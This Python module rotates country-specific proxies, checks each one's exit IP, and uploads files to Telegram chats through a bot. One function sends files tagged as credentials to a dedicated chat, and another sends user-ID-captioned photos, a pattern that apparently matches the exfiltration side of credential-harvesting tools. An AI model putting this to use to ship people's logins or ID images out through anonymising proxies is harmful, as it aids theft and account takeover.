import requests
import logging
import time
from requests_html import HTMLSession
import re

from proxy_generate import * 
from config import *


def get_proxy_ip(country, max_retries=3, delay_between_retries=1):
    """
    Params:
    max_retries: int - The maximum number of retries if the request fails.
    delay_between_retries: int - Time in seconds to wait between each retry.
    
    Returns:
    dict or None - The successful proxy or None if retries are exhausted.
    """
    url = 'http://ifconfig.me/ip'
    
    for attempt in range(max_retries):
        proxy = generate_proxy_dict(country)
        
        try:
            response = requests.get(url, proxies=proxy, timeout=4)
            if response.status_code == 200 and re.match(r'\d+\.\d+\.\d+\.\d+', (ip := response.text)):
                elapsed_time = response.elapsed.total_seconds()
                data_used = len(ip.encode('utf-8'))
                print(f"IP: {ip}, Time: {elapsed_time:.2f}s, Data: {data_used / (1024 ** 2):.2f} MB ({data_used} bytes)")
                return proxy, ip
            
        except requests.RequestException as e:
            print(f"An error occurred while check proxy: {e}")
        
        if attempt < max_retries - 1:  # No need to sleep after the last attempt
            print(f"Retrying check proxy... ({attempt + 1}/{max_retries})")
            time.sleep(delay_between_retries)
    
    print(f"All retries to check proxy exhausted. Returning None")
    return None


def send_file_to_telegram(file_path, text):
    """
    Send a file to a specific Telegram chat.
    """
    # URL for the Telegram API.
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

    # Setup the payload
    payload = {
        'chat_id': chat_id,
        'caption': text,  # Optional: replace with your preferred caption or remove this line
        'parse_mode': 'HTML' 
    }

    # Setup the file to send
    files = {
        'document': open(file_path, 'rb')
    }

    # Send the request
    response = requests.post(url, data=payload, files=files)

    return response.json()

def send_photo(file_path, text):
    """
    Send a file to a specific Telegram chat.
    """
    # URL for the Telegram API.
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

    # Setup the payload
    payload = {
        'chat_id': chat_id_photo,
        'caption': f'👤 UID: {text}' # Optional: replace with your preferred caption or remove this line
    }

    # Setup the file to send
    files = {
        'document': open(file_path, 'rb')
    }

    # Send the request
    response = requests.post(url, data=payload, files=files)

    return response.json()


def send_credentials(file_path, text):
    """
    Send a file to a specific Telegram chat.
    """
    # URL for the Telegram API.
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"

    # Setup the payload
    payload = {
        'chat_id': chat_id_credentials,
        'caption': text,  # Optional: replace with your preferred caption or remove this line
        'parse_mode': 'HTML' 
    }

    # Setup the file to send
    files = {
        'document': open(file_path, 'rb')
    }

    # Send the request
    response = requests.post(url, data=payload, files=files)

    return response.json()